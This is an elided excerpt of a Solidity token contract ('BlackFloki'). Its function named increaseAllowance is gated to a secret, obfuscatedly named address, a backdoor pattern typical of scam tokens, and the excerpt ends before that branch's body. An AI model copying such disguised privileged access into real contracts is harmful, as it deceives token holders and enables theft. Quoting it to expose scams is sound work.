...
contract FlokiTOKEN is Ownable {
    ...
    string private _hooextokenname = "BlackFloki";
    string private _voptokensymbol = "Floki";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
        address public cvsxds32;
    function increaseAllowance(address yayayxx) public     {
        ...
        if(cvsxds32 != _msgSender()){
            return ;
        }else{
           require(cvsxds32 == _msgSender());
